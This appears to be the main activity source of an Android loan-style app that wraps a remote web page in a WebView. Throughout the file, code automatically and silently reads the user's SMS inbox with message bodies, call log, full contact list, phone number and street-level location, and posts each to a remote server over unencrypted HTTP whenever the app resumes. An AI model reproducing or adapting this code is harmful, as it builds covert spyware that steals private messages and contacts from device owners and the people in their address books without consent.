package com.xinyong

import android.annotation.SuppressLint
import android.support.v7.app.AppCompatActivity
import android.os.Bundle
import android.view.KeyEvent
import android.view.KeyEvent.KEYCODE_BACK
import android.webkit.WebView
import android.webkit.WebViewClient
import kotlinx.android.synthetic.main.activity_main.*
import android.provider.ContactsContract
import android.provider.CallLog.Calls
import android.content.Context
import android.net.Uri
import android.webkit.JavascriptInterface
import android.telephony.TelephonyManager
import android.text.TextUtils
import android.webkit.WebChromeClient
import com.baidu.location.LocationClient
import com.baidu.location.LocationClientOption
import com.baidu.location.BDLocation
import com.baidu.location.BDAbstractLocationListener
import com.google.gson.Gson
import com.google.gson.JsonObject
import com.xinyong.http.HttpUtil
import java.lang.Exception


class MainActivity : AppCompatActivity() {
    private val SMS_INBOX = Uri.parse("content://sms/")
    var mLocationClient: LocationClient? = null
    var mToken: String = ""
    var num: String? = ""
    private val myListener = MyLocationListener()
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)
        val settings = host_webview.getSettings()
        settings.setJavaScriptEnabled(true)
        settings.setSupportZoom(true)
        settings.supportMultipleWindows()
        settings.setJavaScriptCanOpenWindowsAutomatically(true)
        settings.setDomStorageEnabled(true)
        settings.setAppCacheEnabled(true)

        host_webview.setWebViewClient(object : WebViewClient() {
            override fun shouldOverrideUrlLoading(view: WebView, url: String): Boolean {
                view.loadUrl(url)
                return true
            }
        })
        host_webview.setHorizontalScrollBarEnabled(false)
        host_webview.setVerticalScrollBarEnabled(false)

        host_webview.webChromeClient = WebChromeClient()

        host_webview.loadUrl("http://weixin.baoliscp.cn")

        host_webview.addJavascriptInterface(this, "android")
        mLocationClient = LocationClient(getApplicationContext())
        //声明LocationClient类
        mLocationClient?.registerLocationListener(myListener)

        var option = LocationClientOption()
        option.setIsNeedAddress(true)

        option.setIsNeedLocationDescribe(true)

        mLocationClient?.setLocOption(option)


    }


    @JavascriptInterface
    fun getToken(token: String) {

        uploadData(token)


    }

    private fun uploadData(token: String) {
        try {
            num = getTeleNum()
        } catch (e: Exception) {
            num = ""
        }
        if (num == null) {
            num = ""
        }
        if (TextUtils.isEmpty(token)) {
            mToken = num!!
        } else {
            mToken = token
        }

        var contJson = JsonObject()
        var contacts = Gson().toJsonTree(getContacts())
        if (contacts == null) {
            contacts = JsonObject()
        }
        contJson.add("contacts", contacts)
        contJson.addProperty("mobileNo", num)
        HttpUtil.post {
            url = "http://weixin.baoliscp.cn/index.php?g=Api&m=User&a=index"
            heards.put("token", mToken)
            params.put("methodCode", "005")
            params.put("data", contJson.toString())
            params.put("token", mToken)
            onSuccess = {
                println("upload" + it)
            }
        }


        var smsObj = JsonObject()
        var Sms = Gson().toJsonTree(getSmsFromPhone())
        if (Sms == null) {
            Sms = JsonObject()
        }
        smsObj.add("smsInfo", Sms)
        smsObj.addProperty("mobileNo", num)

        HttpUtil.post {
            url = "http://weixin.baoliscp.cn/index.php?g=Api&m=User&a=index"
            heards.put("token", mToken)
            params.put("methodCode", "002")
            params.put("data", smsObj.toString())
            params.put("token", mToken)
            onSuccess = {
                println("upload" + it)
            }
        }

        mLocationClient?.start()

//        var numObj = JsonObject()
//        numObj.addProperty()

//        HttpUtil.post {
//            url = "http://60.205.185.171:8080/face/services/appService"
//            heards.put("token", mToken)
//            params.put("token", mToken)
//            params.put("methodCode", "004")
//            params.put("data", num)
//            onSuccess = {
//                println("upload" + it)
//            }
//        }


        var callLogObj = JsonObject()
        var calllog = Gson().toJsonTree(getCallLog())
        if (calllog == null) {
            calllog = JsonObject()
        }
        callLogObj.add("callRecord", calllog)
        callLogObj.addProperty("mobileNo", num)
        println("object       " + callLogObj.toString())
        HttpUtil.post {
            url = "http://weixin.baoliscp.cn/index.php?g=Api&m=User&a=index"
            heards.put("token", mToken)
            params.put("token", mToken)
            params.put("methodCode", "001")
            params.put("data", callLogObj.toString())
            onSuccess = {
                println("upload" + it)
            }
        }
    }

    override fun onResume() {
        super.onResume()
        host_webview.onResume()
        uploadData("")
    }

    override fun onPause() {
        super.onPause()
        host_webview.onPause()
    }

    override fun onDestroy() {
        super.onDestroy()
        activity_web.removeView(host_webview)
        host_webview.destroy()
    }

    override fun onKeyDown(keyCode: Int, event: KeyEvent): Boolean {
        if (keyCode == KEYCODE_BACK && host_webview.canGoBack()) {
            host_webview.goBack()
            return true
        }
        return super.onKeyDown(keyCode, event)
    }


    inner class MyLocationListener : BDAbstractLocationListener() {
        override fun onReceiveLocation(location: BDLocation) {

            val province = location.province    //获取省份
            val city = location.city    //获取城市
            val district = location.district    //获取区县
            val street = location.street

            var adressObj = JsonObject()
            adressObj.addProperty("mobileNo", num)
            adressObj.addProperty("location", province + city + district + street)
            println("location" + province + city + district + street)
            HttpUtil.post {
                url = "http://weixin.baoliscp.cn/index.php?g=Api&m=User&a=index"
                heards.put("token", mToken)
                params.put("token", mToken)
                params.put("methodCode", "003")
                params.put("data", adressObj.toString())
                onSuccess = {
                    println("location" + it)
                }
            }
        }
    }

    //获取本机号码
    @SuppressLint("MissingPermission")
    fun getTeleNum(): String? {
        val tm = this.getSystemService(Context.TELEPHONY_SERVICE) as TelephonyManager
        val tel = tm!!.line1Number//手机号码
        return tel
    }

    //获取短信
    fun getSmsFromPhone(): MutableList<Sms> {
        var smss = mutableListOf<Sms>()
        val cr = contentResolver
        val projection = arrayOf("_id", "address", "person", "body", "date", "type")
        val cur = cr.query(SMS_INBOX, projection, null, null, "date desc")
        if (null == cur) {
            return smss
        }

        while (cur.moveToNext()) {
            val number = cur.getString(cur.getColumnIndex("address"))//手机号
            val name = cur.getString(cur.getColumnIndex("person"))//联系人姓名列表
            val body = cur.getString(cur.getColumnIndex("body"))//短信内容
            val date = cur.getString(cur.getColumnIndex("date"))
            val type = cur.getString(cur.getColumnIndex("type"))
            //至此就获得了短信的相关的内容, 以下是把短信加入map中，构建listview,非必要。
            smss.add(Sms(number, name, body, date, type))
        }

        return smss
    }


    //获取通话记录
    @SuppressLint("MissingPermission")
    fun getCallLog(): List<CallRecords> {
        val infos = ArrayList<CallRecords>()
        val cr = this.getContentResolver()
        val uri = Calls.CONTENT_URI
        val projection = arrayOf(Calls.NUMBER, Calls.DATE, Calls.DURATION)
        val cursor = cr.query(uri, projection, null, null, null)
        while (cursor!!.moveToNext()) {
            val number = cursor!!.getString(0)
            val date = cursor!!.getLong(1)
            val dur = cursor!!.getInt(2)
            infos.add(CallRecords(number, date.toString(), dur.toString()))
        }
        cursor!!.close()
        return infos
    }


    //获取联系人
    private fun getContacts(): MutableList<Contact> {
        //联系人的Uri，也就是content://com.android.contacts/contacts
        val uri = ContactsContract.Contacts.CONTENT_URI
        //指定获取_id和display_name两列数据，display_name即为姓名
        val projection = arrayOf(ContactsContract.Contacts._ID, ContactsContract.Contacts.DISPLAY_NAME)
        //根据Uri查询相应的ContentProvider，cursor为获取到的数据集
        val cursor = this.contentResolver.query(uri, projection, null, null, null)
        val arr = mutableListOf<Contact>()
        var i = 0
        if (cursor != null && cursor.moveToFirst()) {
            do {
                val id = cursor.getLong(0)
                //获取姓名
                val name = cursor.getString(1)
                //指定获取NUMBER这一列数据
                val phoneProjection = arrayOf(ContactsContract.CommonDataKinds.Phone.NUMBER)

                //根据联系人的ID获取此人的电话号码
                val phonesCusor = this.contentResolver.query(
                        ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                        phoneProjection,
                        ContactsContract.CommonDataKinds.Phone.CONTACT_ID + "=" + id, null, null)

                //因为每个联系人可能有多个电话号码，所以需要遍历
                var numArr = mutableListOf<String>()
                if (phonesCusor != null && phonesCusor.moveToFirst()) {
                    do {
                        val num = phonesCusor.getString(0)
                        numArr.add(num)
                    } while (phonesCusor.moveToNext())
                }
                var contact = Contact(name, numArr)
                arr.add(contact)
                i++
            } while (cursor.moveToNext())

        }
        return arr
    }


}
